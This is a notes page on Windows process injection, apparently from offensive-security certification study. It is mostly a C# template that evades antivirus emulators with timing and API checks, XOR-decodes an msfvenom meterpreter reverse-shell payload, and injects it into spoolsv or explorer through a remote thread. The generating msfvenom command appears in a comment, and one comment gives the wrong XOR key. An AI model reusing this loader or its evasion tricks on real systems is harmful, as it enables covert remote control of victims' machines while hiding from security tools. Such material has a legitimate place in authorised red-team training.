# Process Injection

There are a few reasons you may want to inject your shellcode into another process.  \
&#x20;• Extend the life of a beacon into a process that is unlikely to terminate\
&#x20;• Live in a process that isn't blocked by host firewall rules

General Process injection steps:\
&#x20;• Dropper with Shellcode\
&#x20;• Allocate memory in target process\
&#x20;• Copy shellcode onto target \
&#x20;• Execute shellcode\


Templates from: [https://github.com/chvancooten/OSEP-Code-Snippets](https://github.com/chvancooten/OSEP-Code-Snippets)&#x20;

```csharp
﻿using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;



namespace non_emulated
{

    public class Program
    {
        public const uint EXECUTEREADWRITE = 0x40;
        public const uint COMMIT_RESERVE = 0x3000;
        [Flags]
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF
        }
        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000
        }

        [Flags]
        public enum MemoryProtection
        {
            ExecuteReadWrite = 0x40
        }
        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);

        [DllImport("Kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private unsafe static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern Int32 WaitForSingleObject(IntPtr Handle, Int32 Wait);
        [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern UInt32 FlsAlloc(IntPtr callback);
        static bool IsElevated
        {
            get
            {
                return WindowsIdentity.GetCurrent().Owner.IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid);
            }
        }
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);


        public static void Main(string[] args)
        {
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            //we can inject a two-second delay, and if the time
            //checks indicate that two seconds have not passed during the instruction, we assume we are
            //running in a simulator and can simply exit before any suspect code is run
            if (t2 < 1.5)
            {
                return;
            }
            //If the API is not emulated and the code is run by the AV emulator, it will not return a valid address.
            //In this case, we simply exit from the application without performing any malicious actions, similar
            //to the implementation using Sleep.
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }
            //some AV emulators will return a failing condition when FlSAlloc is called
            UInt32 Fls = FlsAlloc(IntPtr.Zero);
            if (Fls == 0xFFFFFFFF)
            {
                return;
            }
            // additional AV evasion can be found here: https://githubmemory.com/repo/cinzinga/Evasion-Practice

            // Xor-encoded payload, key 0xfa
            // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.X.Y LPORT=443 EXITFUNC=thread -f csharp --encrypt xor --encrypt-key J
             byte[] buf = new byte[803] { PAYLOAD };



            int len = buf.Length;
            String procName = "";
            // Parse arguments, if given (process to inject)
            if (IsElevated)
            {
                Console.WriteLine("Process is elevated.");
                procName = "spoolsv";
            }
            else
            {
                Console.WriteLine("Process is not elevated.");
                procName = "explorer";
            }


            Console.WriteLine($"Attempting to inject into {procName} process...");

            // Get process IDs
            Process[] expProc = Process.GetProcessesByName(procName);

            // If multiple processes exist, try to inject in all of them
            for (int i = 0; i < expProc.Length; i++)
            {
                int pid = expProc[i].Id;

                // Get a handle on the process
                IntPtr hProcess = OpenProcess(ProcessAccessFlags.All, false, pid);
                if ((int)hProcess == 0)
                {
                    Console.WriteLine($"Failed to get handle on PID {pid}.");
                    continue;
                }
                Console.WriteLine($"Got handle {hProcess} on PID {pid}.");

                // Allocate memory in the remote process
                IntPtr expAddr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)len, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteReadWrite);
                Console.WriteLine($"Allocated {len} bytes at address {expAddr} in remote process.");

                // Decode the payload
                for (int j = 0; j < buf.Length; j++)
                {
                    buf[j] = (byte)((uint)buf[j] ^ 0x4a);
                }

                // Write the payload to the allocated bytes
                IntPtr bytesWritten;
                bool procMemResult = WriteProcessMemory(hProcess, expAddr, buf, len, out bytesWritten);
                Console.WriteLine($"Wrote {bytesWritten} payload bytes (result: {procMemResult}).");

                IntPtr threadAddr = CreateRemoteThread(hProcess, IntPtr.Zero, 0, expAddr, IntPtr.Zero, 0, IntPtr.Zero);
                Console.WriteLine($"Created remote thread at {threadAddr}. Check your listener!");
                break;
            }
        }
    }
}

```
